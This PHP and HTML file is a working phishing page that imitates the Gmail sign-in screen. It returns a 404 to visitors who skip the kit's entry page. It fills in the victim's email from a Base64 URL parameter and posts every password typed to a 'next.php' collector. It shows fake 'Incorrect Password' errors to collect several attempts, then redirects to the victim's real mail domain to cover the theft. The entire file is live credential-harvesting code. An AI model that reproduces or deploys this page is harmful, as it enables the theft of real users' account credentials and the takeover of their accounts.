<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Gmail</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="main-gmail" class="c-div" style="background: #f0f3f8; height:100vh">
        <div id="all_out-gmail" style="width: 95%;max-width: 1040px;">
            <div id="loadingDiv-gmail" class="c-div" style="margin-top: 100px;"><img src="../assets/img/gmail-lodaing.gif" alt="loading" style="width: 94%;top: 0;left: 0%;visibility: hidden;overflow: hidden;height: 5px;" id="loadingBar"></div>
            <div id="form-outer-gmail" class="sp-div" style="width: 100%;max-width: 1040px;height: 448px;background: var(--bs-body-bg);border-radius: 43px;padding-top: 64px;padding-right: 36px;padding-bottom: 36px;padding-left: 36px;margin-top: 0px;">
                <div id="left-div-gmail" style="width: 50%;"><svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path><path fill="none" d="M2 2h44v44H2z"></path></svg>
                    <h1 class="fw-lighter" style="font-family: 'Open Sans';margin: 0px;padding-top: 6px;">Sign In</h1>
                    <p style="padding-top: 6px;margin: 0px;">to continue to Gmail</p>
                </div>
                <div id="right-div-gmail" style="width: 50%;padding-top: 44px;">
                    <div id="outer-right-gmail">
                        <div id="main-container-gemail">
                            <div id="passconGmail" style="display: block;opacity: 1;">
                                <div style="padding-bottom:15px;">
                                    <div class="c-div"><button class="btn btn-light" id="account_btn"><i><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person-circle" viewbox="0 0 16 16"><path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"></path><path fill-rule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z"></path></svg></i><i style="visibility:hidden;">Z</i><span id="backEm">***********@gmail.com</span><i style="visibility:hidden;">Z</i><i><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewbox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"></path></svg></i></button></div>
                                </div><br>
                                <div>
                                    <p id="err" style="color: rgb(220,0,0);">Incorrect Password, Please try again</p>
                                    <fieldset id="passFieldSet">
                                        <legend class="float-none w-auto px-1" style="color:#1A73E8;margin-left:10px;" id="passLegend">Enter your password</legend><input type="password" id="pass" name="myPassword" style="width: 85%;height: 100%;border-style: none;margin-left: 5px;">
                                    </fieldset>
                                </div>
                                <div id="save-check" style="margin-top: 12px;"><input type="checkbox" style="width:20px;height:20px;cursor:pointer;"><label class="form-label" style="font-size:13px;color:rgb(44, 44, 44);margin-left:3%;">Show password</label></div><br><a class="fw-semibold dblock" style="text-decoration: none;color: #0D6EFD;font-size: 14px;" href="#">Forgot password?</a>
                                <div class="e-div"><button class="btn btn-primary fw-normal" style="float: right;height: 50px;width: 232px;font-size: 13px;font-weight: bold;border-radius: 30px;background: transparent;color: rgb(13,110,253);border-style: none;">Create an account</button><button class="btn btn-primary" id="next-btn" style="float: right;height: 50px;width: 120px;font-size: 13px;font-weight: bold;border-radius: 30px;" onclick="nextFun();">Next</button></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="footer-gmail" class="sp-div" style="padding-top: 8px;padding-bottom: 8px;padding-left: 30px;padding-right: 30px;">
                <div id="lf"><a href="#" style="color: var(--bs-emphasis-color);font-size: 12px;">English (United State)</a></div>
                <div id="rf"><a href="#" style="margin-right: 34px;color: var(--bs-emphasis-color);font-size: 12px;">Help</a><a href="#" style="margin-right: 34px;color: var(--bs-emphasis-color);font-size: 12px;">Privacy</a><a href="#" style="margin-right: 0px;color: var(--bs-emphasis-color);font-size: 12px;">Terms</a></div>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>